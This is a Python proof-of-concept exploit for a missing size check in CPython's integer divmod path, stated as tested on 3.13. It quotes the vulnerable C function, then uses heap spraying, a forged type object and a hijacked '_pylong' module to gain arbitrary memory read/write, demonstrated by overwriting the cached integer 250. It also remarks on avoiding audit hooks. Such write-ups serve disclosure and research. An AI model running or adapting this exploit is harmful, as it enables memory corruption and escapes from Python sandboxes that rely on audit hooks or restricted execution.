"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Missing size check on a tuple allows us to grab arbitrary data out of bounds
# Tested to work on 3.13.0, 3.13.1
# (should work on 3.14, but tuple struct changed so the exploit needs to be modified)

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/longobject.c#L4323-L4358
"""
static int
pylong_int_divmod(PyLongObject *v, PyLongObject *w,
                  PyLongObject **pdiv, PyLongObject **pmod)
{
    PyObject *mod = PyImport_ImportModule("_pylong");
    if (mod == NULL) {
        return -1;
    }
    PyObject *result = PyObject_CallMethod(mod, "int_divmod", "OO", v, w); // <--- func we can control
    Py_DECREF(mod);
    if (result == NULL) {
        return -1;
    }
    if (!PyTuple_Check(result)) { // <--- checks to make sure result is a tuple, but it doesn't check
                                  //      if there's two items in the tuple
        Py_DECREF(result);
        PyErr_SetString(PyExc_ValueError,
                        "tuple is required from int_divmod()");
        return -1;
    }
    PyObject *q = PyTuple_GET_ITEM(result, 0);
    PyObject *r = PyTuple_GET_ITEM(result, 1);
    if (!PyLong_Check(q) || !PyLong_Check(r)) { // <--- a bit of an issue since we'd prefer for our obj
                                                //      to not be an int, but we can do some cool workarounds
        Py_DECREF(result);
        PyErr_SetString(PyExc_ValueError,
                        "tuple of int is required from int_divmod()");
        return -1;
    }
    if (pdiv != NULL) {
        *pdiv = (PyLongObject *)Py_NewRef(q);
    }
    if (pmod != NULL) {
        *pmod = (PyLongObject *)Py_NewRef(r);
    }
    Py_DECREF(result);
    return 0;
}
"""

# So the goal here is to return a tuple of 1 item (can't do 0 because that'll just use the cached 0-tuple) where
# the data following it contains a pointer to an object we can control. We can pull this off by using bytearrays since their
# buffers are allocated independently of the object itself, so our fake data can come after the tuple data. To bypass the
# PyLong_Check, all you have to do it set a bit in the type->flags field, so we can make our fake object, then pad it with
# empty bytes until we reach the flags field and then set that one bit, then use our fake object as our returned object's type.
# (probably makes no sense, I don't even remember how I came up with this idea it's so stupid, but hopefully reading the code can help)

SIZE = 0x30 - 8
spray = [(0xdeadbeef + i,) for i in range(0x2000)]

prealloc = bytearray(b"A" * SIZE)
bas = [bytearray() for _ in range(50)]

# After this spray, we should hopefully have our heap set up in a way that looks like:
# tuple data -> bytearray buffer -> tuple data -> bytearray buffer -> ...
objs = []
for i in range(50):
    objs.append((0x1234 + i,))
    bas[i].extend(prealloc)

to_return = objs[-1]
to_modify = bas[-1]

p64 = lambda num: num.to_bytes(8, 'little')
TP_FLAGS_OFFSET = 0xA8

# this one's a bit crazy because it'll be our fake bytearray object but also act as an int subclass type
fake_type = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) +
    p64(0)
).ljust(TP_FLAGS_OFFSET, b"\0") + p64(1 << 24)

fake_obj = (
    p64(0x1111) + # ob_refcnt
    p64(id(fake_type) + bytes.__basicsize__ - 1) # ob_type
)

# this data *should* be the data following the tuple content in `to_return`
to_modify[:8] = p64(id(fake_obj) + bytes.__basicsize__ - 1)

# to get divmod to use _pylong.int_divmod, we need to divide
# two obnoxiously large numbers. These two work to do that.
a = int("9" * 4300)
b = int("1" * 2800)

def int_divmod(a, b):
    return to_return

# super jank but is safe from triggering any audit hooks
# (as long as sys.modules wasn't cleared before)
import sys
x = lambda: ...
x.int_divmod = int_divmod
sys.modules['_pylong'] = x

# can do the same thing by just doing
"""
import _pylong
_pylong.int_divmod = int_divmod
"""
# but will likely trigger audit hook

_, y = divmod(a, b)

# as explained above, we needed to make a fake type that could trick the code
# into thinking it was an int subclass with the actual evil bytearray being stored at the start,
# so now we can retrieve our evil bytearray object by just getting the type of `y`
mem = type(y)

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100